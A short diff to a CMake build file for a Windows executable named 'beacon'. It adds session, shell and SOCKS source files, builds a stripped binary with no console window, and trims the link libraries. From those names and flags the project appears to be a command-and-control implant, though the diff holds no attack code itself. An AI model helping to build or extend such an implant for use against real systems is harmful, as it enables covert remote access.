@@ -8,6 +8,9 @@ add_executable(beacon
     src/protocol/message.c
     src/protocol/crypto.c
     src/comms/http.c
+    src/comms/session.c
+    src/comms/shell.c
+    src/comms/socks.c
     src/exec/exec.c
     src/exec/builtin.c
     src/resolve/resolve.c
@@ -18,4 +21,4 @@ add_executable(beacon
 target_include_directories(beacon PRIVATE include)
 target_compile_options(beacon PRIVATE -O2 -Wall -Wextra)
 target_link_options(beacon PRIVATE -s -mwindows)
-target_link_libraries(beacon ws2_32 iphlpapi dnsapi netapi32)
+target_link_libraries(beacon ws2_32)
